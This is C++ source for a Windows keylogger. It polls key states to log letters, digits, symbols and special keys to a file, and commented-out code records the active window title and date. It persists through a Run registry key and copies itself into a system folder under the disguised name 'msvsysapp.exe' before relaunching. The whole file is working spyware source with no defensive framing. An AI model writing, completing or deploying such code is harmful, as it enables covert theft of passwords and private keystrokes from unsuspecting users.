#include "KeyLogger.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include "CCLip.h"

using std::cout;
using std::fstream;
using std::string;

KeyLogger::KeyLogger()
{

}

KeyLogger::~KeyLogger()
{
	logs.close();
}

char KeyLogger::ChangeKeyToXChar(int key)
{
	if (key == 48) {
		return ')';
	}
	else
		if (key == 49) {
			return '!';
		}
		else
			if (key == 50) {
				return '@';
			}
			else
				if (key == 51) {
					return '#';
				}
				else
					if (key == 52) {
						return '$';
					}
					else
						if (key == 53) {
							return '%';
						}
						else
							if (key == 54) {
								return '^';
							}
							else
								if (key == 55) {
									return '&';
								}
								else
									if (key == 56) {
										return '*';
									}
									else
										if (key == 57) {
											return '(';
										}
										else
											return 0;
}

//void KeyLogger::ReadingSpecialKeys(int key, fstream & fs)
//{
//	switch (key) {		//check pressed key
//	case VK_SPACE:
//		fs << " ";
//		break;
//	case VK_RETURN:
//		fs << "-[ENTER]-";
//		break;
//	case VK_TAB:
//		fs << "-[TAB]-";
//		break;
//	case VK_BACK:
//		fs << "-[BS]-";
//		break;
//	case VK_CONTROL:
//		fs << "-[CTRL]-";
//		break;
//	case VK_MENU:
//		fs << "-[ALT]-";
//		break;
//	case VK_CAPITAL:
//		fs << "-[CAPS]-";
//		break;
//	case VK_ESCAPE:
//		fs << "-[ESC]-";
//		break;
//	default:
//		break;
//	}
//}

void KeyLogger::OEMkeys(fstream &fs)
{	
	fs.open(LogPath.c_str(), fstream::app);
	for (oKey = VK_OEM_1; oKey <= VK_OEM_7; oKey++) { //OEM KEYS like ",.<>[}{} 
			temp = GetAsyncKeyState(oKey);
			if (temp == -32767) {
				switch (oKey) {		//check pressed key
	case VK_OEM_1:
		if (GetKeyState(VK_SHIFT)) {
			fs << ":";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << ";";
			break;
		}
	case VK_OEM_PLUS:
		if (GetKeyState(VK_SHIFT)) {
			fs << "+";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "=";
			break;
		}
	case VK_OEM_COMMA:
		if (GetKeyState(VK_SHIFT)) {
			fs << "<";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << ",";
			break;
		}
	case VK_OEM_MINUS:
		if (GetKeyState(VK_SHIFT)) {
			fs << "_";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "-";
			break;
		}
	case VK_OEM_PERIOD:
		if (GetKeyState(VK_SHIFT)) {
			fs << ">";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << ".";
			break;
		}
	case VK_OEM_2:
		if (GetKeyState(VK_SHIFT)) {
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "/";
			break;
		}
	case VK_OEM_3:
		if (GetKeyState(VK_SHIFT)) {
			fs << "`";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "~";
			break;
		}
	case VK_OEM_4:
		if (GetKeyState(VK_SHIFT)) {
			fs << "{";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "[";
			break;
		}
	case VK_OEM_5:
		if (GetKeyState(VK_SHIFT)) {
			fs << "|";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "\\";
			break;
		}
	case VK_OEM_6:
		if (GetKeyState(VK_SHIFT)) {
			fs << "}";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "]";
			break;
		}
	case VK_OEM_7:
		if (GetKeyState(VK_SHIFT)) {
			fs << "\"";
			break;
		}
		else if (!GetKeyState(VK_SHIFT)) {
			fs << "\'";
			break;
		}
	default:
		break;
	}
				continue;
			}
		}
		fs.close();
	}

string KeyLogger::GetWindowTitle()
{
	char title[256];
	HWND handle = GetForegroundWindow();
	GetWindowText(handle, title, 512);
	return title;
}

//void KeyLogger::ReadingKey(fstream &fs)
//{
//	const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat");
//	fs.open(LogPath.c_str(), fstream::app);
//	time_t sysbasetime = time(0);
//	char * date = ctime(&sysbasetime);
//	CClip cp;
//	string handle = GetWindowTitle(); fstream clipFile;
//	fs << "\n \n	" << date << " \n";
//	fs << "APP: " << handle << '\n';
//	while (true)
//	{
//		if (handle != GetWindowTitle()) {
//			Sleep(300);
//			fs << "\n \nAPP: " << GetWindowTitle() << '\n';
//			handle = GetWindowTitle();
//		}
//	}
//}

void KeyLogger::AZkeys(fstream  &fs)
{
	//A-Z; a-z
	fs.open(LogPath.c_str(), fstream::app);
	for (key = 65; key <= 90; key++) {

		temp = GetAsyncKeyState(key);
		if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT) && !GetKeyState(VK_CAPITAL)) {	//small letters
			fs << char(key + 32);
		}
		else if (temp == -32767 && (GetAsyncKeyState(VK_SHIFT) || GetKeyState(VK_CAPITAL))) { //big letters
			fs << char(key);
		}
	}
	fs.close();
}

void KeyLogger::NUMkeys(fstream &fs)
{
	fs.open(LogPath.c_str(), fstream::app);
	for (key = '0'; key <= '9'; key++) { //log numbers
		temp = GetAsyncKeyState(key);
		if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT)) {
			fs << char(key);
		}
		else if (temp == -32767 && GetAsyncKeyState(VK_SHIFT)) { //log extra characters  (characters above numbers on keyboard)
			fs << ChangeKeyToXChar(key);//change key to '!', '@' etc.
		}
	}
	fs.close();
}

void KeyLogger::SpecialKeys(fstream &fs)
{
	fs.open(LogPath.c_str(), fstream::app);
	//Special Keys
	for (sKey = 8; sKey <= 32; sKey++) { //Special Keys like VK_SPACE, VK_RETURN etc
		temp = GetAsyncKeyState(sKey);
		if (temp == -32767) {
			switch (sKey) {		//check pressed key
			case VK_SPACE:
				fs << " ";
				break;
			case VK_RETURN:
				fs << "-[ENTER]-";
				break;
			case VK_TAB:
				fs << "-[TAB]-";
				break;
			case VK_BACK:
				fs << "-[BS]-";
				break;
			case VK_CONTROL:
				fs << "-[CTRL]-";
				break;
			case VK_MENU:
				fs << "-[ALT]-";
				break;
			case VK_CAPITAL:
				fs << "-[CAPS]-";
				break;
			case VK_ESCAPE:
				fs << "-[ESC]-";
				break;
			default:
				break;
			};
			continue;
		}
	}
	fs.close();
}

void KeyLogger::AddREG()
{
	string temp = SystemPath + "\\msvsysapp.exe\"";
	string command = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v msvsysapp /f /t REG_SZ /d \"" + temp;
	system(command.c_str());
}

void KeyLogger::CopyToSys(string fp)
{
	string command = "copy \"" + fp + "\" " + SystemPath;
	system(command.c_str());

	if (fp != (SystemPath + "\\msvsysapp.exe")) {
		string temp = "start " + SystemPath + "\\msvsysapp.exe";
		system(temp.c_str());
		exit(EXIT_SUCCESS);
	}
}
